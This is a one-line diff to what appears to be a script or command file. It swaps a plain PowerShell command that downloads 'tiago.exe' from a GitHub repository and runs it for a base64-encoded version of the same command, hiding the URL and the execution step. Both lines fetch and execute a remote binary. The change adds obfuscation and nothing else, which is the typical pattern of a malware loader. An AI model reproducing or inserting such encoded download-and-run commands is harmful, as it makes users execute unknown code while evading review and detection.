@@ -1,1 +1,1 @@
-powershell iwr 'https://github.com/TelmoRibeiro/TestingGrounds/blob/master/exe/tiago.exe?raw=true' -OutFile './tiago.exe'; ./tiago.exe
+powershell -encodedcommand aXdyICdodHRwczovL2dpdGh1Yi5jb20vVGVsbW9SaWJlaXJvL1Rlc3RpbmdHcm91bmRzL2Jsb2IvbWFzdGVyL2V4ZS90aWFnby5leGU/cmF3PXRydWUnIC1PdXRGaWxlICcuXHRpYWdvLmV4ZSc7IC4vdGlhZ28uZXhl
